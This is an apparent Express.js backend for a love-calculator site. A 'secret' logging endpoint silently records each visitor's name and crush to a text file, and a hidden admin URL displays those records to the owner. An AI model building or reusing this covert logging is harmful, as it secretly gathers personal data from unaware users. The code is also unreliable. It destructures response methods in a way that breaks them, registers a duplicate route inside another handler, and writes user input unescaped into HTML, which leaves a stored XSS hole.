const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS so your frontend website can talk to this backend
app.use(cors());
app.use(express.json());

// 1. Secret Background Data Logger Endpoint
app.post('/api/secure-log', (req, { writeHead, end }) => {
    const { name1, name2, percentage } = req.body;
    const timestamp = new Date().toLocaleString();
    
    // Format the line to append to your secret text file
    const logEntry = `[${timestamp}] User: ${name1} | Crush: ${name2} | Match: ${percentage}%\n`;

    // Append data smoothly to logs.txt
    fs.appendFile(path.join(__dirname, 'logs.txt'), logEntry, (err) => {
        if (err) {
            console.error('Failed to write execution log:', err);
            writeHead(500, { 'Content-Type': 'application/json' });
            end(JSON.stringify({ success: false }));
            return;
        }
        writeHead(200, { 'Content-Type': 'application/json' });
        end(JSON.stringify({ success: true }));
    });
});

// 2. Secret Live Viewer Route (Only you know this URL exists!)
app.get('/secret-admin-panel-view', ({ writeHead, end }) => {
    fs.readFile(path.join(__dirname, 'logs.txt'), 'utf8', (err, data) => {
        if (err) {
            writeHead(200, { 'Content-Type': 'text/html' });
            end('<h2>No records found yet. Keep sharing your site!</h2>');
            return;
        }
        
        // Convert the raw text file into a clean, scannable dark-themed HTML interface
        const htmlRows = data.trim().split('\n').map(line => `<li>${line}</li>`).join('');
        const dashboardHtml = `
            <html>
            <head>
                <title>Private Live Master Logs</title>
                <style>
                    body { font-family: sans-serif; background: #0b0914; color: #00ffcc; padding: 40px; }
                    h1 { color: #ff3366; border-bottom: 2px solid #332255; padding-bottom: 10px; }
                    ul { list-style-type: none; padding: 0; }
                    li { background: #161224; padding: 12px 20px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #ff3366; font-family: monospace; font-size: 15px; }
                </style>
            </head>
            <body>
                <h1>🔒 Master Love Calculator Logs</h1>
                <ul>${htmlRows}</ul>
            </body>
            </html>
        `;
        writeHead(200, { 'Content-Type': 'text/html' });
        end(dashboardHtml);
    });
    // Upgraded Secret Live Viewer Route
app.get('/secret-admin-panel-view', (req, res) => {
    fs.readFile(path.join(__dirname, 'logs.txt'), 'utf8', (err, data) => {
        // If the file doesn't exist yet, show a clean, working page instead of failing
        if (err || !data) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <html>
                <head>
                    <title>Private Live Master Logs</title>
                    <style>
                        body { font-family: sans-serif; background: #0b0914; color: #b3b3cc; padding: 40px; text-align: center; }
                        h1 { color: #ff3366; }
                    </style>
                </head>
                <body>
                    <h1>🔒 Master Love Calculator Logs</h1>
                    <h2>No database records found yet. Try calculating a love percentage on the main page first!</h2>
                </body>
                </html>
            `);
            return;
        }
        
        const htmlRows = data.trim().split('\n').map(line => `<li>${line}</li>`).join('');
        const dashboardHtml = `
            <html>
            <head>
                <title>Private Live Master Logs</title>
                <style>
                    body { font-family: sans-serif; background: #0b0914; color: #00ffcc; padding: 40px; }
                    h1 { color: #ff3366; border-bottom: 2px solid #332255; padding-bottom: 10px; }
                    ul { list-style-type: none; padding: 0; }
                    li { background: #161224; padding: 12px 20px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #ff3366; font-family: monospace; font-size: 15px; }
                </style>
            </head>
            <body>
                <h1>🔒 Master Love Calculator Logs</h1>
                <ul>${htmlRows}</ul>
            </body>
            </html>
        `;
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(dashboardHtml);
    });
});
});

app.listen(PORT, () => console.log(`Custom Secure Backend active on port ${PORT}`));
